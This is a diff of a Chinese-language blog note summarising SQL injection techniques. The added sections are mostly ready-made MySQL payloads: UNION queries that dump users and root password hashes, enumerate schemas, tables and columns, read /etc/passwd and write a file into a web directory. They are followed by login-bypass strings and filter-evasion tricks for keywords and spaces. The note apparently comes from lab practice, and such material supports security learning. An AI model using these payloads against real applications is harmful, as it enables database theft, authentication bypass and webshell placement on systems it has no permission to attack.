@@ -1,9 +1,8 @@
 ---
-title: SQL注入类型总结
-date: 2019-04-09 22:13:05
+title: SQL注入技巧总结
+date: 2020-01-10 22:13:05
 tags:
-    - SQL
-    - 注入
+    - SQL注入
 categories:
     - 笔记总结
 ---
@@ -35,10 +34,92 @@ categories:
 | 编码绕过     | 未对编码过滤，可进行url、ascil等常用的编码payload            |
 | 内联注释绕过 | /*!and*/                                                     |
 
-## 备注
+## 反注入函数总结
+|函数名称|作用|
+|---------- | -------------- |
+|addslashes($string)|用反斜线引用字符串中的特殊字符' " \|
+|mysql_escape_string($string)|用反斜杠转义字符串中的特殊字符，用于mysql_query()查询|
+|mysql_real_escape_string($string)|转义SQL语句中使用的字符串中的特殊字符，并考虑到连接的当前字符集，需要保证当前是连接状态才能用该函数，否则会报警告。 不转义%与_|
 
-1. 善用Sqlmap的Tamper
-2. 掌握编程一门编程语言以及可编写简单的Tamper
-3. 掌握手工注入技巧
-4. 不断积累注入及绕过经验
-5. 熟悉多种数据库查询语句
+## 注入常用函数总结
+|函数名称|作用|
+|---------- | -------------- |
+|group_concat|可以把查询的内容组合成一个字符串|
+|load_file(file name ) |读取文件并将文件按字符串返回|
+|left（string，length）|返回最左边指定的字符数：left（database（），1）>’s’ (猜名字)|
+|length（）|判断长度length（database（）>5 |
+|substr（a，b，c) | 从字符串a中截取 b到c长度 |
+|ascii（）|将某个字符转为ascii值ascii（substr（user（），1，1））=101#|
+|mid（a，b，c）|从字符串a中截取 b到c位置（可以用来猜数据库名 ）|
+
+## 常查询变量
+
+|变量|返回结果|
+|----- | -----|
+| database | 数据库名 |
+| version | 数据库版本号 |
+| user | 数据库当前用户名 |
+| @@basedir | 数据库安装路径 |
+| @@version_compile_os | 数据库操作系统 |
+
+## 注入常用命令
+
+
+* 查看当前用户
+> union select 1,(select user())–+
+
+* 查看数据库版本
+> union select 1,(select version())–+
+
+* 查看当前数据库名
+> union select 1,(select database())–+
+
+* 查看操作系统
+> union select 1,(select @@version_compile_os)–+
+
+* 所有用户
+> union select 1,(select group_concat(user) from mysql.user)–+
+
+* 用户hash
+> union select 1,(select group_concat(password) from mysql.user where user=’root’)
+
+* 查看所有数据库名
+> union select 1,(SELECT group_concat(schema_name) from information_schema.schemata)–+
+
+* 查看某一个库的全部表
+> union select 1,(SELECT group_concat(table_name) from information_schema.tables where table_schema=’库名’)–+
+> union select 1,(SELECT group_concat(table_name) from information_schema.table_constraints where table_schema=’库名’
+
+* 查看某个表的字段名
+> union select 1,(SELECT group_concat(column_name) from information_schema.columns where table_name=’表名’)–+
+
+* 查看某个库中某个表的字段名
+> union select 1,(select group_concat(column_name) from information_schema.columns where table_name=’表名’ and table_schema=’库名’)–+
+
+* 读文件
+> union select 1,(SELECT load_file(‘/etc/passwd’))–+
+
+* 写文件
+> union select 1,’‘ into outfile ‘C:\phpStudy\PHPTutorial\WWW\Less-8\3.php’–+
+
+
+## 绕过登录验证
+* admin’ –
+* admin’ #
+* admin’/*
+* ‘ or 1=1–
+* ‘ or 1=1#
+* ‘ or 1=1/*
+* ‘) or ‘1’=’1–
+* ‘) or (‘1’=’1–
+
+
+## 特定符号绕过
+|符号名|绕过方法|
+|----------- | --------------|
+|空格|%09 %0a %A0 %20 /**/|
+|注释符|-- - /* .... */ # ` ;%00 %23|
+|union|uniounionn UNioN uni/**/on /*!union*/|
+|select|selecselectt SeCel/**/t /*!select*/|
+|or|oorr OR o/**/r /*!or*/ |||
+|and| && anandd ANd an/**/d /*!and*/|
